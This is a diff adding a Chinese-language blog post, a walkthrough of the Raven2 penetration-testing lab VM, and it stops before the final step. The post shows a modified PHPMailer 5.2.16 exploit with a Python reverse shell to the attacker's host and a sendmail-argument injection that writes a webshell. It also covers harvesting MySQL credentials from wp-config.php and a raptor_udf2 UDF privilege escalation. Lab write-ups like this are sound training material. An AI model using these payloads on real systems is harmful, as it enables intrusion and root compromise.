@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="第三个渗透靶机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Raven2">
+<meta property="og:url" content="http://example.com/2026/02/27/Raven2/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="第三个渗透靶机">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yk.jsdu.cn/20260227/453c8f7d6a4a83e245929673d29c9f8a.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260227/11026e159dc28bc38a004268f2a9a723.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260227/9068abad0d04b8e0575670e9b197ec82.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260227/0ff9cb31d6816fba1f5c218ecf788b14.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260227/4a34cba047c4bd88b5a5d1c4b472d713.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260227/1529f419dbd3a4c08fdfc2ad6c2e8950.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260227/ef7010401c7011bddcf4b07cf610a5cf.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260227/927885697bd9457a5b1120cce02f8c1d.png">
+<meta property="article:published_time" content="2026-02-27T01:00:35.000Z">
+<meta property="article:modified_time" content="2026-02-27T08:55:57.035Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="渗透靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yk.jsdu.cn/20260227/453c8f7d6a4a83e245929673d29c9f8a.png">
+
+
+<link rel="canonical" href="http://example.com/2026/02/27/Raven2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2026/02/27/Raven2/","path":"2026/02/27/Raven2/","title":"Raven2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Raven2 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">提权</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/27/Raven2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Raven2 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Raven2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-02-27 09:00:35 / Modified: 16:55:57" itemprop="dateCreated datePublished" datetime="2026-02-27T09:00:35+08:00">2026-02-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>第三个渗透靶机</p>
+<span id="more"></span>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>这个靶机让我体会到了信息收集的重要性，后面反思了下靶机没打通的原因主要还是信息收集没到位。和前面的手法一样，先通过<code>arp-scan -l</code> 或者 <code>nmap</code> 来找到靶机IP，这里是<code>192.168.4.132</code></p>
+<p>接着进行全端口扫描，<code>nmap -p 1-65535 192.168.4.132</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nmap -p 1-65535 192.168.4.132</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2026-02-26 20:22 EST</span><br><span class="line">Nmap scan report for 192.168.4.132</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">42729/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:64:50 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.97 seconds</span><br></pre></td></tr></table></figure>
+
+<p>开放了<code>22、80、111、42729</code> 端口</p>
+<p>开放了80端口，即web服务，所以我利用<code>xray</code>的被动扫描结合御剑进行了一波信息收集，发现用的框架是<code>wordpress</code>，接着用<code>kali</code>自带的<code>wpscan</code>来对<code>wordpress</code>进行专项扫描<code>wpscan --url http://192.168.4.132/wordpress</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[+] URL: http://192.168.4.132/wordpress/ [192.168.4.132]</span><br><span class="line">[+] Started: Thu Feb 26 20:44:32 2026</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://192.168.4.132/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://192.168.4.132/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://192.168.4.132/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://192.168.4.132/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).</span><br><span class="line"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="line"> |  - http://192.168.4.132/wordpress/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.7&#x27;</span><br><span class="line"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.4.132/wordpress/, Match: &#x27;WordPress 4.8.7&#x27;</span><br></pre></td></tr></table></figure>
+
+<p> 收集到了一些信息，可以发现<code>wordpress</code>的版本信息<code>4.8.7</code>，搜索一下，有一篇文章是讲<code>[PHP反序列化漏洞的新攻击面_wordpress反序列化-CSDN博客](https://blog.csdn.net/Fly_hps/article/details/82736157)</code>    但是需要先登录进去，刚好前期扫描也发现了登录的口子：<code>http://192.168.4.132/wordpress/wp-login.php</code>但是到这里思路就已经断了。因为不管输入什么账号密码，都会跳转。爆破也不行。</p>
+<p>前期因为思维懒惰性，没有对收集到的信息进行一个一个遍历利用。。。其实这里通过<code>dirb</code>收集或者<code>dirsearch</code> 都可以发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/dirsearch]</span><br><span class="line">└─# dirsearch -u http://192.168.4.132</span><br><span class="line">                                                                                                                                     Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/.local/share/Trash/files/dirsearch/reports/http_192.168.4.132/_26-02-26_20-30-22.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.4.132/</span><br><span class="line"></span><br><span class="line">[20:30:22] Starting:                                                                                                                     </span><br><span class="line">[20:30:23] 200 -   18KB - /.DS_Store                                                                               </span><br><span class="line">[20:30:25] 200 -    3KB - /about.html                                       </span><br><span class="line">[20:30:30] 200 -    3KB - /contact.php                                                 </span><br><span class="line">[20:30:33] 200 -  762B  - /js/                                                    </span><br><span class="line">[20:30:34] 200 -  201B  - /manual/index.html                                </span><br><span class="line">[20:30:41] 200 -  816B  - /vendor/                                          </span><br><span class="line">[20:30:42] 200 -    1KB - /wordpress/wp-login.php                           </span><br><span class="line">[20:30:42] 200 -   17KB - /wordpress/                                       </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure>
+
+<p>比如这里的<code>vendor</code>文件夹，我觉得没有什么东西就没去管它。。。。犯了信息收集的大忌</p>
+<p>但其实<code>vendor</code>里面蕴含了大量信息：</p>
+<p><img src="https://yk.jsdu.cn/20260227/453c8f7d6a4a83e245929673d29c9f8a.png" alt="raven1"></p>
+<p>可以发现是用的<code>PHPMailer</code> 以及版本为<code>5.2.16</code>，<code>google</code>搜一下相关poc <code>PHPMailer 5.2.16 exploit</code>，第一个就是：</p>
+<p><img src="https://yk.jsdu.cn/20260227/11026e159dc28bc38a004268f2a9a723.png" alt="raven2"></p>
+<p>给了漏洞相关的详细信息，这里给了漏洞ID，所以我们也可以直接在kali里面找到相关漏洞利用的脚本：</p>
+<p><img src="https://yk.jsdu.cn/20260227/9068abad0d04b8e0575670e9b197ec82.png" alt="raven3"></p>
+<p>当然我们需要对脚本进行一些修改，一共是四处：</p>
+<p><img src="https://yk.jsdu.cn/20260227/0ff9cb31d6816fba1f5c218ecf788b14.png" alt="raven4"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">target=<span class="string">&#x27;http://192.168.4.132/contact.php&#x27;</span>  <span class="comment">#改成我们靶机的目标地址，随便一个php文件</span></span><br><span class="line"></span><br><span class="line">backdoor=<span class="string">&#x27;/123.php&#x27;</span>   <span class="comment">#这里一开始我没改，直接用的backdoor.php这个名字，发现写不进去，换了个名字就写进去了，可能有检测？</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.4.130\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span> <span class="comment">#这里主要就是把反弹shell的IP改一下就行了，改成我们用来监听的那个IP，这里是kali的IP</span></span><br><span class="line"></span><br><span class="line">fields=&#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/123.php server\&quot; @protonmail.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Pwned&#x27;</span>&#125;  <span class="comment">#这里主要就是写入shell的路径改下，改成web目录的路径，这里默认尝试 /var/www/html</span></span><br></pre></td></tr></table></figure>
+
+<p>具体使用就是直接用python3环境来运行:<code>python 40974.py</code>，然后kali 起一个监听4444端口:  <code>nc -lvp 4444</code>，然后我们随便访问一下target:<code>http://192.168.4.132/contact.php</code>，接着会生成<code>123.php</code>，我们访问一下<code>http://192.168.4.132/123.php</code>，就会收到弹回来的shell：</p>
+<p><img src="https://yk.jsdu.cn/20260227/4a34cba047c4bd88b5a5d1c4b472d713.png" alt="raven5"></p>
+<p> 反弹shell拿到的权限是<code>www-data</code>用户的权限。这里有个小技巧，为了让我们的终端使用更方便，不会因为<code>ctrl+z</code> 动不动就退出去。也不会因为删除键而产生一些乱码。我们可以这样来做：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反弹到shell之后</span><br><span class="line">1.python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">2.Ctrl+z 退出去</span><br><span class="line">3.stty raw -echo;fg  注意这两个命令放一起，不要分开执行，之前就是分开执行一直没成功</span><br><span class="line">4.Ctrl+c 发现此时拿到的就是一个增强性的交互式终端了，可以通过⬆⬇来找命令，和我们kali正常的shell一样好用了。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yk.jsdu.cn/20260227/1529f419dbd3a4c08fdfc2ad6c2e8950.png" alt="raven6"></p>
+<p>进去之后依然是信息收集—</p>
+<p>这里在 &#x2F;wordpress&#x2F; 下面可以找到<code>wp-config.php</code> 可以翻到数据库的账号密码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;R@v3nSecurity&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>root/R@v3nSecurity</code></p>
+<p>但是前期我们扫描端口，发现3306没有开启，这里有两种可能，一个是mysql没有对外开放，另外一个就是可能用的是其他端口。我们<code>ps -aux</code> 来看一下：</p>
+<p>发现<code>mysql</code>进程是运行的在，并且还是以root权限在运行</p>
+<p><img src="https://yk.jsdu.cn/20260227/ef7010401c7011bddcf4b07cf610a5cf.png" alt="raven7"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>接下来就是进去到mysql里面，看看能不能通过mysql来提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">输入密码：R@v3nSecurity</span><br><span class="line">进入到mysql控制台</span><br><span class="line">select version(); 得到版本5.5.60</span><br></pre></td></tr></table></figure>
+
+<p>接下来可以尝试UDF提权，网上可以搜一下<code>mysql 5.5.60 udf exploit</code>，可以发现一个4.x 5.x的通用UDF提权脚本，对应的EDB-ID是1518，所以这里也是可以通过kali找到对应的脚本的，找到之后，放到kali桌面上，python起一个Web服务，然后wget下载到靶机上面，通过靶机的环境来编译，具体的编译方式这里usage给出了说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g -c raptor_udf2.c</span><br><span class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br></pre></td></tr></table></figure>
+
+<p>有了<code>.so</code>文件之后我们来看看到底怎么利用</p>
+<p>UDF就是user define function：用户自定义函数，UDF提权就是用户自定义函数提权，相当于通过mysql自定义的函数来执行系统命令，而mysql如果又是运行在root上的， 那不就是以root的身份执行了一个系统命令？那这样权限就可以得到扩充了。所以这个利用有些前提：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql 运行在root上面</span><br><span class="line">我们拿到的mysql账户可以在一些目录下面进行文件的导入导出操作，这样才有可能把.so文件搞到插件目录/plugin里面去</span><br></pre></td></tr></table></figure>
+
+<p>第一个条件验证满足，第二个条件我们通过<code>show global variables like &#39;secure%&#39;;</code> 来看安全参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;secure%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里的<code>secure_file_priv</code>对应的空值，所以是允许文件进行导入导出的。没有任何限制。如果这里是<code>null</code>那就是不允许，如果是具体的一个值，那就是限制了导入导出的目录。</p>
+<p>所以接下来做的一切工作都是想办法把UDF提权脚本弄到靶机上面，然后编译，然后弄到&#x2F;plugin下面，最后通过自定义函数以root的身份来执行系统命令.</p>
+<p>所以第一步我们是把raptor_udf2.c文件弄到靶机上面，一般会选择&#x2F;tmp目录，因为一般可写。和前面几个靶机的方法一样：</p>
+<p><code>kali：python -m http.server 9999 </code></p>
+<p><code>靶机:cd /tmp  wget http://192.168.4.130:9999/raptor_udf2.c</code></p>
+<p>弄到靶机的<code>/tmp</code>目录之后需要编译成<code>.so</code>文件，这里按照poc的usage编译会报错，问了一下gemini，做了一些更正，多了一个<code>-fPIC</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.gcc -g -c -fPIC raptor_udf2.c -o raptor_udf2.o</span><br><span class="line">2.gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br></pre></td></tr></table></figure>
+
+<p>经过编译之后，在&#x2F;tmp下生成了 <code>raptor_udf2.so</code>文件</p>
+<p>第二步就是怎么把靶机<code>/tmp/raptor_udf2.so</code>文件的内容搞到mysql的plugin下面，这里先通过<code>show global variables like &#39;plugin%&#39;;</code> 找到插件目录的位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;plugin%&#x27;;</span><br><span class="line">找到plugin所在位置：/usr/lib/mysql/plugin</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; create table foo(line blob); #创建一个表，只有一行，存储二进制数据</span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;/tmp/raptor_udf2.so&#x27;)); #把.so的二进制流数据放到foo表里面</span><br><span class="line">mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/227.so&#x27;; #从foo表里面提取出来写入到plugin插件目录里面</span><br><span class="line">mysql&gt; create function do_system returns integer soname &#x27;227.so&#x27;;#创建同名函数do_system，并告知加载227.so 这个动态链接库。</span><br></pre></td></tr></table></figure>
+
+<p>执行完以上命令之后，可以发现函数已经被成功创建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+-----------+-----+--------+----------+</span><br><span class="line">| name      | ret | dl     | type     |</span><br><span class="line">+-----------+-----+--------+----------+</span><br><span class="line">| do_system |   2 | 227.so | function |</span><br><span class="line">+-----------+-----+--------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>第三步就是执行恶意命令</p>
